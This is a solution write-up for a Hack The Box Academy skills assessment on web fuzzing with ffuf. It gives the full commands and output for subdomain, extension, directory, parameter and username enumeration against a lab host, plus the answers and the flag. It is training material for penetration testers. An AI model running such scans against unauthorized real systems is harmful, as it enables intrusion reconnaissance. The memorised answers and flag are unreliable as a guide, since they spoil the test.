# [Attacking Web Applications with Ffuf](https://academy.hackthebox.com/module/details/54)

## Skills Assessment

You are given an online academy's IP address but have no further information about their website. As the first step of conducting a Penetration Test, you are expected to locate all pages and domains linked to their IP to enumerate the IP and domains properly.

Finally, you should do some fuzzing on pages you identify to see if any of them has any parameters that can be interacted with. If you do find active parameters, see if you can retrieve any data from them.

### Questions

#### Question #01

**Question**

Run a sub-domain/vhost fuzzing scan on `*.academy.htb` for the IP shown above. What are all the sub-domains you can identify? (Only write the sub-domain name)

```
┌─[eu-academy-1]─[10.10.14.13]─[htb-ac-1461567@htb-frlhcebehe]─[~]
└──╼ [★]$ echo -e '94.237.123.50\tacademy.htb' | sudo tee -a /etc/hosts

94.237.123.50	academy.htb
```

```
┌─[eu-academy-1]─[10.10.14.13]─[htb-ac-1461567@htb-frlhcebehe]─[~]
└──╼ [★]$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:50460/ -H 'Host: FUZZ.academy.htb' -fs 985

[SNIP]

test                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 19ms]
archive                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 17ms]
faculty                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 16ms]

[SNIP]
```

**Answer**

```
test, archive, faculty
```

#### Question #02

**Question**

Before you run your page fuzzing scan, you should first run an extension fuzzing scan. What are the different extensions accepted by the domains?

```
┌─[eu-academy-1]─[10.10.14.13]─[htb-ac-1461567@htb-frlhcebehe]─[~]
└──╼ [★]$ echo -e '94.237.123.50\ttest.academy.htb archive.academy.htb faculty.academy.htb' | sudo tee -a /etc/hosts

94.237.123.50	test.academy.htb archive.academy.htb faculty.academy.htb
```

```
┌─[eu-academy-1]─[10.10.14.13]─[htb-ac-1461567@htb-frlhcebehe]─[~]
└──╼ [★]$ ffuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://faculty.academy.htb:50460/indexFUZZ

[SNIP]

.phps                   [Status: 403, Size: 287, Words: 20, Lines: 10, Duration: 16ms]
.php                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4677ms]
.php7                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 4679ms]

[SNIP]
```

**Answer**

```
php, phps, php7
```

#### Question #03

**Question**

One of the pages you will identify should say 'You don't have access!'. What is the full page URL?
 
```
┌─[eu-academy-1]─[10.10.14.13]─[htb-ac-1461567@htb-frlhcebehe]─[~]
└──╼ [★]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://faculty.academy.htb:50460/FUZZ -recursion -recursion-depth 1 -e .php,.phps,.php7 -v -fs 287 -t 100 -ic

[SNIP]

[INFO] Starting queued job on target: http://faculty.academy.htb:50460/courses/FUZZ

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 17ms]
| URL | http://faculty.academy.htb:50460/courses/
    * FUZZ: 

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 18ms]
| URL | http://faculty.academy.htb:50460/courses/index.php
    * FUZZ: index.php

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 24ms]
| URL | http://faculty.academy.htb:50460/courses/index.php7
    * FUZZ: index.php7

[Status: 200, Size: 774, Words: 223, Lines: 53, Duration: 17ms]
| URL | http://faculty.academy.htb:50460/courses/linux-security.php7
    * FUZZ: linux-security.php7

[SNIP]
```

```
┌─[eu-academy-1]─[10.10.14.13]─[htb-ac-1461567@htb-frlhcebehe]─[~]
└──╼ [★]$ curl http://faculty.academy.htb:50460/courses/linux-security.php7

  <div class='center'><p>You don't have access!</p></div>

[SNIP]
```

**Answer**

```
http://faculty.academy.htb:PORT/courses/linux-security.php7
```

#### Question #04

**Question**

In the page from the previous question, you should be able to find multiple parameters that are accepted by the page. What are they?
 
```
┌─[eu-academy-1]─[10.10.14.13]─[htb-ac-1461567@htb-frlhcebehe]─[~]
└──╼ [★]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:50460/courses/linux-security.php7?FUZZ=key -fs 774 -t 100

[SNIP]

user                    [Status: 200, Size: 780, Words: 223, Lines: 53, Duration: 16ms]

[SNIP]
```

```
┌─[eu-academy-1]─[10.10.14.13]─[htb-ac-1461567@htb-frlhcebehe]─[~]
└──╼ [★]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:50460/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs 774 -t 100

[SNIP]

user                    [Status: 200, Size: 780, Words: 223, Lines: 53, Duration: 16ms]
username                [Status: 200, Size: 781, Words: 223, Lines: 53, Duration: 17ms]

[SNIP]
```

**Answer**

```
user, username
```

#### Question #05

**Question**

Try fuzzing the parameters you identified for working values. One of them should return a flag. What is the content of the flag?
 
```
┌─[eu-academy-1]─[10.10.14.13]─[htb-ac-1461567@htb-frlhcebehe]─[~]
└──╼ [★]$ ffuf -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ -u http://faculty.academy.htb:50460/courses/linux-security.php7 -X POST -d 'username=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 781 -t 100

[SNIP]

harry                   [Status: 200, Size: 773, Words: 218, Lines: 53, Duration: 16ms]

[SNIP]
```

```
┌─[eu-academy-1]─[10.10.14.13]─[htb-ac-1461567@htb-frlhcebehe]─[~]
└──╼ [★]$ curl http://faculty.academy.htb:50460/courses/linux-security.php7 -X POST -d 'username=harry' -H 'Content-Type: application/x-www-form-urlencoded'

[SNIP]

<div class='center'><p>HTB{w3b_fuzz1n6_m4573r}</p></div>

[SNIP]
```

**Answer**

```
HTB{w3b_fuzz1n6_m4573r}
```

---
---
